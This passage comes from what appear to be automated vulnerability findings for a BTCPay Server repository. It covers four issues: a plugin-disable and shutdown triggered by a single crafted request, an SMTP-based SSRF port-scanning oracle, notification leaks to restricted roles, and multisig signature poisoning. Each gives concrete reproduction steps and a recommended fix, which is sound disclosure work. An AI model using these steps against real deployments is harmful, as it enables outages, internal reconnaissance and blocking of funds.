2. [BTCPayServer/Plugins/PluginManager/PluginExceptionHandler.cs:21–44](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PluginManager/PluginExceptionHandler.cs#L21-L44)
   For every unhandled request exception the handler calls IsExceptionByPlugin; on a non-system match it queues a persistent 'disable' command for that plugin and calls IHostApplicationLifetime.StopApplication after 3 s. GetDisablePluginIfCrash (41-45) is true on both branches, so nothing opts a request out.
3. [BTCPayServer/Controllers/UIPaymentRequestController.cs:97–114](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIPaymentRequestController.cs#L97-L114)
   Concrete low-privilege source: GET /stores/{storeId}/payment-requests (CanViewPaymentRequests) runs Enum.Parse<PaymentRequestStatus>(s, true) on every value of the user-supplied 'status' filter; an unknown value throws ArgumentException "Requested value '<s>' was not found." unhandled, with <s> fully attacker-controlled.
4. [BTCPayServer/Models/BasePagingViewModel.cs:26–51](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Models/BasePagingViewModel.cs#L26-L51)
   SearchTerm is model-bound from the query string and combined into the SearchString returned by GetSearch(), so ?SearchTerm=status:<PluginAssemblyName> places the attacker string into the status filter.
5. [BTCPayServer/SearchString.cs:39–50](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/SearchString.cs#L39-L50)
   Filter parsing splits on ',' and the first ':' with no allow-list on values; GetFilterArray("status") (100-104) returns the raw strings.
6. [BTCPayServer/Hosting/Startup.cs:158–172](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/Startup.cs#L158-L172)
   The only global exception filters are JsonHttpExceptionFilter and JsonObjectExceptionFilter, which handle just their own exception types; an ArgumentException from an action reaches the exception-handler middleware registered at line 336 (UseExceptionHandler).
7. [BTCPayServer/Hosting/BTCPayServerServices.cs:299](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/BTCPayServerServices.cs#L299)
   PluginExceptionHandler is registered as the IExceptionHandler consulted by UseExceptionHandler for every unhandled request exception.
8. [BTCPayServer/Plugins/PluginManager.cs:146–159](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PluginManager.cs#L146-L159)
   TopologicalSort places system plugins (assembly 'BTCPayServer') first in the enumeration IsExceptionByPlugin walks. A message containing 'BTCPayServer' therefore matches the system plugin and is ignored by the handler, which is why the attack is limited to third-party plugins whose assembly name does not contain 'BTCPayServer'.
9. [BTCPayServer/Plugins/PluginManager.cs:581–592](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PluginManager.cs#L581-L592)
   DisablePlugin(PreloadedPlugin) appends 'disable:<assemblyName>' to PluginDir/commands; ExecuteCommands applies it at the next start (490-507), so the plugin stays disabled across restarts until an admin re-enables it.
10. [BTCPayServer/Controllers/UIStorePullPaymentsController.PullPayments.cs:311–314](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIStorePullPaymentsController.PullPayments.cs#L311-L314)
   Second store-level path with the same shape: POST payouts runs Enum.Parse<PayoutState> on the user-supplied Command prefix, echoing it into an unhandled ArgumentException.
11. [BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs:447](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs#L447)
   Third store-level path: Enum.Parse<CrowdfundResetEvery>(vm.ResetEvery) on a posted form value.

## Impact
Availability: the whole multi-tenant BTCPay process (checkout, API, UI for every store) is stopped; restart depends on an external supervisor and a bare `dotnet BTCPayServer.dll` deployment stays down. The targeted plugin is then skipped at load (PluginManager.cs:224-228), so its functionality stays removed until an admin re-enables it; the attack can be repeated for each further vulnerable plugin or after re-enablement. Integrity: the attacker writes server configuration state (PluginDir/commands and the resulting 'disabled' list), a limited but durable change reserved to server admins. Confidentiality: none.

## Reproduction steps
1. Attacker: a registered non-admin user who owns or is a member of any store (registration open by default; CanModifyStoreSettingsUnscoped succeeds for every user, BuiltInPermissionHandler.cs:52-63). Delivery: one authenticated GET /stores/{ownStoreId}/payment-requests?SearchTerm=status:<PluginAssemblyName>. SearchString puts the value into the status filter; Enum.Parse<PaymentRequestStatus> throws an ArgumentException echoing it; no MVC filter or middleware catches it; ExceptionHandlerMiddleware consults PluginExceptionHandler, which attributes by substring, queues 'disable', and stops the host after 3 s. Deterministic, no defence to evade. Deployment condition outside attacker control: an installed, enabled third-party plugin whose assembly name lacks the substring 'BTCPayServer' (names containing it match the system plugin first and are ignored). Assumptions: net10.0 System.Private.CoreLib Enum.Parse message "Requested value '{0}' was not found."; ASP.NET Core 10 ExceptionHandlerMiddleware invokes registered IExceptionHandler services before the ExceptionHandlingPath fallback (the project's own comment at PluginExceptionHandler.cs:36-37 relies on this).

## Recommended fix
1. IsExceptionByPlugin infers plugin fault from a substring match on exception.Message, text that routinely contains untrusted request input, so any user who can provoke an unhandled BCL exception echoing input chooses which plugin is blamed. Fix criteria: Attribution must rely only on evidence the attacker cannot author: frames in the exception's stack trace (and inner exceptions) belonging to a plugin load context, or exception.Source/TypeLoadException assembly identity. The Message.Contains heuristic must be removed or restricted to the startup path; after the fix, an ArgumentException from Enum.Parse carrying a plugin name must yield IsExceptionByPlugin == false.
2. PluginExceptionHandler converts a single attributed request exception into an irreversible disable plus process shutdown with no threshold, no confirmation, and an opt-out (GetDisablePluginIfCrash) that is always true. Fix criteria: A request-time exception must not by itself disable a plugin and stop the server: require either a startup-phase failure, an admin-confirmed action, or at minimum a repeated-failure threshold on plugin-owned frames; fix GetDisablePluginIfCrash so the opt-out is effective. Verify that the GET payment-requests request above returns a 500 without touching PluginDir/commands or stopping the host.
3. Store-level endpoints pass user-supplied filter/command values to Enum.Parse, producing unhandled exceptions that echo input. Fix criteria: Use Enum.TryParse (or model-bound enums) at UIPaymentRequestController.cs:114, UIStorePullPaymentsController.PullPayments.cs:314 and UICrowdfundController.cs:447/452/525 so invalid values yield a 400/validation error rather than an unhandled exception.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Reliance on untrusted input
**CWE:** [CWE-807](https://cwe.mitre.org/data/definitions/807.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257588

---

# Store SMTP settings connect to any host:port outside the SSRF guard, letting a store owner probe internal services

## Details
BTCPay Server 2.4.5 blocks private-network destinations that users configure for webhooks, Lightning connections, LNURL and invoice notification URLs (Changelog 2.4.5; docs/operators/README.md 'Allow Private Outbound Destinations'), because 'a user who can configure an outbound destination ... could make BTCPay Server connect to services that are reachable from the server but not from the public internet'. The SMTP server a store configures is such a destination and is left out: EmailSettings.CreateSmtpClient (EmailSettings.cs:100-126) connects with MailKit's SmtpClient to whatever Server:Port the settings name. MailKit opens its own TCP socket, so the SSRF guard - installed only as a SocketsHttpHandler.ConnectCallback on named HttpClients (SSRFProtectionExtensions.cs:19-32) - never runs, and EmailSettings.Validate (lines 68-75) checks only the From address. Neither Extensions.IsLocalNetwork nor the operator's ssrfexceptions list is consulted.

Reachable paths for a store-level principal (any store Owner, or a custom role / API key holding CanModifyStoreSettings; self-registered users create stores and own them):

1. Oracle: POST stores/{storeId}/email-settings with command=Test (UIStoresEmailController.cs:44-48 -> UIEmailControllerBase.cs:43-79). With IsCustomSMTP=true the posted Settings are used as-is (UIStoresEmailController.cs:67-71); IsComplete needs only a mailbox From, a Server and a Port. CreateSmtpClient connects inline within the request, and line 77 writes ex.Message into the page's status message. A closed port fails immediately with a socket error; an open port whose service does not speak first (HTTP, PostgreSQL, NBXplorer, Lightning REST, cloud metadata) hangs until the 10 s CancellationTokenSource cancels; a service that sends a greeting yields an SMTP protocol/command error (carrying the greeting text when it starts with a 3-digit code); a real SMTP server yields success or an authentication/relay error. Latency alone already distinguishes closed from open, independent of the message text. Repeating per host:port (Docker service names such as nbxplorer, postgres, bitcoind, lnd resolve inside the deployment network) maps the internal network from the server's position - the reconnaissance the SSRF guard exists to deny.

2. Blind connect/relay: PUT /api/v1/stores/{storeId}/email (GreenfieldStoreEmailController.cs:58-77) or the UI Save path stores an internal Server:Port; POST /api/v1/stores/{storeId}/email/send (lines 30-44) or any store email rule then makes EmailSender.SendEmail connect there and, if the peer answers 220, submit the tenant's message. Where the deployment has an SMTP relay reachable only from the server network (for example the host MTA), this relays tenant-authored mail through it; whether such a relay exists is deployment-dependent and is not required for path 1.

MailKit only sends commands after a valid 220 greeting (SMTP server speaks first), so arbitrary protocol data is not injected into non-SMTP services; the confirmed impact is internal reachability/service reconnaissance plus reaching internal SMTP listeners. DisableCertificateCheck is a legitimate user toggle and is not part of the defect. The server-level settings pages (CanModifyServerSettings) exercise the same code but that principal already has host-level trust and gains nothing, so this finding is scoped to store-level principals.

Dependency assumption: MailKit 4.18.1 (BTCPayServer.csproj:46) SmtpClient.ConnectAsync reads the server greeting before sending any command and throws SocketException / OperationCanceledException / SmtpProtocolException / SmtpCommandException as described; no project test or usage contradicts this, and the latency oracle holds regardless of exception text.

## Evidence
1. [BTCPayServer/Plugins/Emails/Services/EmailSettings.cs:100–125](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Emails/Services/EmailSettings.cs#L100-L125)
   CreateSmtpClient calls MailKit SmtpClient.ConnectAsync(Server, Port.Value, SecureSocketOptions.Auto) with a 10 s CancellationTokenSource. Server and Port come straight from the stored/posted settings; there is no hostname/IP check and, because MailKit opens its own socket rather than an HttpClient, the project's SSRF ConnectCallback never runs. This is the only outbound SMTP connect in the tree and the place a destination policy must be enforced.
2. [BTCPayServer/Plugins/Emails/Controllers/UIEmailControllerBase.cs:43–78](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Emails/Controllers/UIEmailControllerBase.cs#L43-L78)
   command=Test: the posted settings (via GetEmailSettingsForTest) are connected inline within the request (line 65) and any exception's Message is written to the status message (line 77). Together with the response latency (immediate socket error vs. the 10 s connect timeout) this gives the caller an oracle over whether an internal host:port is closed, open-but-silent, speaks SMTP, or returns some other greeting.
3. [BTCPayServer/Plugins/Emails/Controllers/UIStoresEmailController.cs:44–47](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Emails/Controllers/UIStoresEmailController.cs#L44-L47)
   The store POST handler is gated only by CanModifyStoreSettings (cookie), the permission every store Owner holds and that custom roles / API-key authorizations may grant.
4. [BTCPayServer/Plugins/Emails/Controllers/UIStoresEmailController.cs:67–70](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Emails/Controllers/UIStoresEmailController.cs#L67-L70)
   GetEmailSettingsForTest returns the caller's posted model.Settings whenever IsCustomSMTP is true, so the Test connection goes to the caller's Server:Port.
5. [BTCPayServer/Plugins/Emails/Services/EmailSettings.cs:68–74](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Emails/Services/EmailSettings.cs#L68-L74)
   Validate checks only that From is a mailbox address; Server and Port are never validated against loopback, RFC1918, link-local or metadata ranges, nor against the operator's ssrfexceptions.
6. [BTCPayServer/Controllers/GreenField/GreenfieldStoreEmailController.cs:58–76](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldStoreEmailController.cs#L58-L76)
   PUT /api/v1/stores/{storeId}/email (CanModifyStoreSettings) persists arbitrary Server/Port with the same From-only validation; POST /api/v1/stores/{storeId}/email/send (lines 30-44, CanSendStoreEmail, included in CanModifyStoreSettings) then makes the background EmailSender connect to that destination on demand (blind variant).
7. [BTCPayServer/SSRFProtectionExtensions.cs:19–31](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/SSRFProtectionExtensions.cs#L19-L31)
   The shipped SSRF control is attached via IHttpClientBuilder.ConfigurePrimaryHttpMessageHandler/SocketsHttpHandler.ConnectCallback, so it covers only named HttpClients (webhooks, Lightning safe client, PayJoin, Bitpay IPN). MailKit's SmtpClient socket is not an HttpClient and is never covered.
8. [docs/operators/README.md:68–73](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/docs/operators/README.md#L68-L73)
   The project's own statement of the threat its guard defends against: 'a user who can configure an outbound destination, such as a webhook, could make BTCPay Server connect to services that are reachable from the server but not from the public internet ... node APIs, cloud metadata endpoints'. The SMTP Server field is such a user-configurable outbound destination and is not covered.

## Impact
The attacker learns the internal network layout reachable from the BTCPay host (which hosts/ports are open, which speak SMTP or return a banner) - information the project's SSRF guard is designed to withhold from this principal. No BTCPay data is modified and no availability impact on BTCPay itself (each probe is bounded by the 10 s connect timeout).

## Reproduction steps
1. Attacker: any store Owner (or custom role / API key with CanModifyStoreSettings); registration is open by default and store creation needs no approval. On the store Emails page (or via a scripted POST with the antiforgery token) they set IsCustomSMTP=true, Server to an internal name or address, Port to the target port, any mailbox From and TestEmail, and submit command=Test; the status message and response time reveal whether that host:port is closed, open, or speaks SMTP. Repeat for each candidate host:port. Alternatively PUT the settings via Greenfield and trigger /email/send for a blind connection. Default configuration; the SMTP path is outside the SSRF guard regardless of disablessrfprotection/ssrfexceptions.

## Recommended fix
Outbound SMTP connections are made with MailKit's own socket, so the project's SSRF destination policy (private-address block plus ssrfexceptions), which is attached only to HttpClient handlers, is never applied to the store-configurable SMTP Server/Port, and the Test command returns low-level connection error text to the caller. Fix criteria: Store-level SMTP destinations must be subject to the same destination policy as other user-configured outbound connections: resolve Server and refuse loopback, private, link-local and metadata addresses unless permitted by ssrfexceptions (server-admin-configured settings may be exempt), enforced at connect time (e.g. a MailKit proxy/socket wrapper or pre-connect resolution check) so the Test, Save, Greenfield PUT and background-send paths are all covered; and the Test result shown to store users must not expose raw socket/protocol error text. Verify: a store owner submitting Test or PUT with Server=127.0.0.1, an RFC1918 address or a Docker service name is refused before any socket is opened, and failures return only a generic message.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** SSRF
**CWE:** [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257579

---

# Store invoice and payout notifications fan out to every store member regardless of role permissions, leaking invoice ids and payout activity to restricted roles

## Details
NotificationSender.GetUsers (BTCPayServer/Services/Notifications/NotificationSender.cs:69-76) resolves a StoreScope to every ctx.UserStore row whose StoreDataId matches, narrowing by role only when the caller passes StoreScope.Roles; the member's StoreRole permissions are never consulted. All three production senders of store-scoped notifications construct `new StoreScope(storeId)` with no roles: InvoiceWatcher (InvoiceEventNotification for Confirmed/settled, PaidAfterExpiration, ExpiredPaidPartial, FailedToConfirm), PullPaymentHostedService (PayoutNotification: awaiting approval / approved and awaiting payment, with payout method) and BitcoinLikePayoutHandler (ExternalPayoutTransactionNotification). The read side (NotificationManager.GetNotificationsQueryable filters only by ApplicationUserId; UINotificationsController, the NotificationsDropDown Blazor component and GET /api/v1/users/me/notifications all go through it) applies no per-store permission filter either, and the Greenfield DTO returns the ActionLink as `link`.

The server ships roles that carry no invoice or payout permission: migration 20260203123000 seeds 'Wallet Manager' (canmanagewallets), 'Multisigner' (canmanagewallettransactions) and 'Multisigner Guest' (cansigntransactions, which per WalletsPlugin.cs:62-70 implies only CanViewWallet); store owners can also define custom roles with any permission subset. StoreRepository.GetStoreRoles lists these server-wide roles in the owner's member-role dropdown. The project's own RolesTests (BTCPayServer.Tests/RolesTests.cs:579-583) assert that a 'Wallet Manager' member is refused on the store's /invoices, /pull-payments and /payouts pages, and UIInvoiceController.Invoice is gated by CanViewInvoices - so the role model intends these members not to see invoice or payout data.

A member holding such a role nevertheless receives, in the notification bell, on /notifications and from GET /api/v1/users/me/notifications (any key with btcpay.user.canviewnotificationsforuser): 'Invoice abcde.. is settled / was paid after expiration / expired with partial payments / has payments that failed to confirm', with the ActionLink carrying the FULL invoice id (/invoices/{invoiceId}); 'A new payout is awaiting for approval' / 'is approved and awaiting payment' with the payout method; and external payout transaction alerts. Following the ActionLink yields 403, but the full invoice id it contains opens the anonymous checkout page GET /i/{invoiceId} (UIInvoiceController.UI.cs:736-742, no authorization) and the receipt GET /i/{invoiceId}/receipt (receipts enabled by default via ReceiptOptions.CreateDefault), which display the invoice's amount, currency, status and payment details. The member therefore learns the store's complete invoice settlement stream (on-chain and Lightning) with amounts, and its payout activity - data the authorization layer denies that role.

The gain over what the project already concedes to the role is real but modest: a CanViewWallet member can already see on-chain transactions with invoice/payout labels on the wallet page, but not Lightning invoices, invoice lifecycle states, payouts before any transaction exists, or anything at all for custom roles lacking CanViewWallet. Attacker position: an authenticated store member with a restricted role (threat-model adversary 3) - PR:LOW; delivery is passive, so AT:NONE and UI:NONE.

## Evidence
1. [BTCPayServer/Services/Notifications/NotificationSender.cs:69–75](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Notifications/NotificationSender.cs#L69-L75)
   For StoreScope, recipients are every UserStore row of the store; the only narrowing is `roles == null || roles.Contains(u.StoreRoleId)`, and no caller supplies roles. The member's StoreRole permissions are never evaluated. This is the code the fix must change.
2. [BTCPayServer/HostedServices/InvoiceWatcher.cs:241–244](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/InvoiceWatcher.cs#L241-L244)
   InvoiceEventNotification (settled / paid-after-expiration / expired-partial / failed-to-confirm, carrying the full invoice id) is sent with `new StoreScope(b.Invoice.StoreId)` and no roles, i.e. to all members.
3. [BTCPayServer/HostedServices/PullPaymentHostedService.cs:776–783](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/PullPaymentHostedService.cs#L776-L783)
   PayoutNotification (awaiting approval / approved and awaiting payment, with payout method) is sent with `new StoreScope(payout.StoreDataId)` and no roles.
4. [BTCPayServer/Data/Payouts/BitcoinLike/BitcoinLikePayoutHandler.cs:437–442](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Data/Payouts/BitcoinLike/BitcoinLikePayoutHandler.cs#L437-L442)
   ExternalPayoutTransactionNotification is likewise sent to every member of the store regardless of role.
5. [BTCPayServer/Services/Notifications/NotificationManager.cs:107–109](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Notifications/NotificationManager.cs#L107-L109)
   Read side: notifications are selected by ApplicationUserId only; no per-store permission check is applied when the UI, Blazor dropdown or Greenfield API renders them, so nothing downstream compensates for the unfiltered fan-out.
6. [BTCPayServer/Services/Notifications/Blobs/InvoiceEventNotification.cs:50–64](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Notifications/Blobs/InvoiceEventNotification.cs#L50-L64)
   The rendered body discloses the invoice id prefix and its state transition, and ActionLink carries the full invoice id in the URL; GreenfieldNotificationsController.ToModel returns it as `link`.
7. [BTCPayServer/Controllers/UIInvoiceController.UI.cs:736–741](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.UI.cs#L736-L741)
   GET /i/{invoiceId} (checkout) has no authorization; with the full invoice id from the notification link a restricted member views the invoice's amount, currency and status. GET /i/{invoiceId}/receipt (line 198) is likewise anonymous and receipts are enabled by default.
8. [BTCPayServer/Plugins/Wallets/WalletsPlugin.cs:62–69](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/WalletsPlugin.cs#L62-L69)
   cansigntransactions implies only CanViewWallet; it does not include btcpay.store.canviewinvoices, canviewpayouts or canviewpullpayments, so such a member is refused on the invoice and payouts pages the notifications link to.
9. [BTCPayServer.Data/Migrations/20260203123000\_AddWalletRoles.cs:16–22](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Data/Migrations/20260203123000_AddWalletRoles.cs#L16-L22)
   Default roles 'Wallet Manager', 'Multisigner' and 'Multisigner Guest' are seeded on every server with wallet-only permissions; StoreRepository.GetStoreRoles offers them in the owner's member-role dropdown, so affected members exist without any custom role.
10. [BTCPayServer.Tests/RolesTests.cs:579–583](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Tests/RolesTests.cs#L579-L583)
   The project's own test asserts a 'Wallet Manager' member is denied the store's /invoices, /pull-payments and /payouts pages - the boundary the notification fan-out crosses.
11. [BTCPayServer/Services/Notifications/NotificationScopes.cs:8–17](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Notifications/NotificationScopes.cs#L8-L17)
   StoreScope exposes an optional Roles restriction, but no production caller supplies it, and a role-id allowlist would in any case not express 'members whose role grants permission X'.

## Impact
Discloses to a member the role model excludes from invoices and payouts: every settled/failed invoice event for the store (on-chain and Lightning) with the full invoice id, and through the anonymous checkout/receipt pages the invoice's amount, currency and payment details; plus payout existence/state/method. No buyer PII beyond what the receipt shows, no payout destinations, and no integrity or availability effect; the gain over the wallet page a CanViewWallet member already sees is modest.

## Reproduction steps
1. An authenticated user added to a store under a role without invoice/payout permissions (the seeded wallet roles, or any custom role) passively receives the store's invoice settlement and payout notifications in the UI and via GET /api/v1/users/me/notifications with a btcpay.user.canviewnotificationsforuser key; the returned link carries the full invoice id, which opens the anonymous /i/{invoiceId} and /i/{invoiceId}/receipt pages. No defence stands in the way and no deployment condition is required beyond normal use of restricted roles.

## Recommended fix
Recipient selection for store-scoped notifications is by store membership only; the member's role permissions are never evaluated against the permission needed to view the underlying object, and the StoreScope.Roles restriction is unused by every caller. Fix criteria: A store notification reaches only members whose StoreRole grants the permission required to view the referenced object (CanViewInvoices for invoice events, CanViewPayouts/CanViewPullPayments for payout events), evaluated at send time via the role's PermissionSet as MultisigEmailTriggerHostedService.GetWalletScopedRecipients already does. Verify: a member holding only btcpay.store.cansigntransactions, btcpay.store.canmanagewallets, or a custom role without those policies receives no invoice or payout notification rows for the store, in the UI, the dropdown or from GET /api/v1/users/me/notifications.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Missing authorization
**CWE:** [CWE-862](https://cwe.mitre.org/data/definitions/862.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257578

---

# Pending multisig transaction accepts unverified partial signatures, letting one cosigner poison other signers' slots

## Details
PendingTransactionService.CollectSignature is the server-side signature-collection step of the server-coordinated multisig workflow. It is reachable by any store user holding WalletPolicies.CanSignWalletTransactions (the shipped built-in 'Multisigner Guest' role grants only this permission, Migrations/20260203123000_AddWalletRoles.cs:21) through UIWalletsController.RedirectToWalletPSBTReady (UIWalletsController.cs:1630-1648), reached from POST /wallets/{walletId}/vault or POST /wallets/{walletId}/psbt command=collect (UIWalletsController.PSBT.cs:156,190). The PSBT is taken verbatim from the request (vm.SigningContext.PSBT / vm.PSBT) and parsed at line 1639; the same role can read the pending PSBT, including every cosigner pubkey in its witness/redeem script, via ViewPendingTransaction (UIWalletsController.cs:128-176).

TryCollectSignatureOnce (173-274) merges the submitted PSBT into the stored one with PSBT.Combine (211) and retains it whenever it changes any per-input counter. The only cryptographic check is HasValidFinalScripts (398-410), which verifies inputs that already carry final scriptSig/witness; partial signatures are never verified. GetSignatureProgress (423-461) counts a PartialSigs entry as collected solely because its PubKey is one of the multisig script's keys (440). The blob stores no submitter identity (CollectedSignature has only ReceivedPSBT and Timestamp), so a poisoned entry cannot be attributed from the UI.

Consequences for a malicious cosigner A in an M-of-N wallet with cosigners B, C...:
- A submits the pending PSBT with well-formed DER signatures (e.g. its own signature with a flipped byte, as the maintainers' own test helper InvalidateAndReassignSignatures builds) keyed to B's and C's pubkeys. The PSBT is retained (meaningful delta) and SignaturesCollected jumps to N; WalletTransactions.cshtml (300-317) shows e.g. '2 collected, 0 missing' while the state stays Pending.
- BuildEffectivePsbt (412-421) rebuilds the merged PSBT by replaying retained PSBTs in order. Assumption on NBitcoin 10.0.15 (pinned in BTCPayServer.csproj:37): PSBT.Combine -> PSBTInput.UpdateFrom adds partial_sigs with TryAdd, so the first entry per pubkey wins. Under that behaviour the genuine signatures B and C later submit for their own pubkeys are silently discarded on merge (no counter delta, so not even retained), TryFinalize can never assemble M valid signatures, and the pending transaction never reaches Signed/Broadcast. Even under last-wins semantics A, who is emailed on every SignatureCollected event by MultisigEmailTriggerHostedService, can re-poison after each genuine signature.
- The owner's only in-product recourse is Cancel (CanCancelWalletTransactions, which the attacker's role lacks) and recreate, which A, notified of PendingTransactionCreated, can poison again; honest signers can only recover by finalising the PSBT out of band and submitting the finalised result.

This defeats the M-of-N threshold property the feature exists to provide: the design tolerates N-M uncooperative signers, but a single signer with the lowest signing role vetoes everybody else's signatures and corrupts the displayed progress, effectively exercising cancel without the permission. The maintainers' test (MultisigTests.cs:384-399) confirms invalid partial signatures attributed to another pubkey are knowingly retained and counted; the case where the impersonated signer's genuine signature arrives afterwards is not covered.

## Evidence
1. [BTCPayServer/HostedServices/PendingTransactionService.cs:209–233](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/PendingTransactionService.cs#L209-L233)
   The submitted PSBT is merged with mergedPsbt.Combine(psbt) and retained whenever it changes the per-input counters. Only finalized inputs are validated (HasValidFinalScripts); partial signatures are never checked against the sighash or tied to the submitting user.
2. [BTCPayServer/HostedServices/PendingTransactionService.cs:423–460](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/PendingTransactionService.cs#L423-L460)
   GetSignatureProgress counts a partial signature as collected purely because its pubkey appears in the witness/redeem script (line 440); a bogus signature keyed to another cosigner's pubkey increments SignaturesCollected.
3. [BTCPayServer/HostedServices/PendingTransactionService.cs:412–420](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/PendingTransactionService.cs#L412-L420)
   BuildEffectivePsbt replays every retained PSBT in order via Combine; an earlier bogus partial signature for pubkey P persists in the merged view, so a later genuine signature for P produces no counter delta, is not retained, and cannot take its place (assumption: NBitcoin 10.0.15 PSBTInput.UpdateFrom adds partial_sigs with TryAdd).
4. [BTCPayServer/HostedServices/PendingTransactionService.cs:398–409](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/PendingTransactionService.cs#L398-L409)
   The only signature validation present applies to inputs that already carry final scripts; non-finalized inputs with partial signatures pass unchecked.
5. [BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs:1630–1647](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs#L1630-L1647)
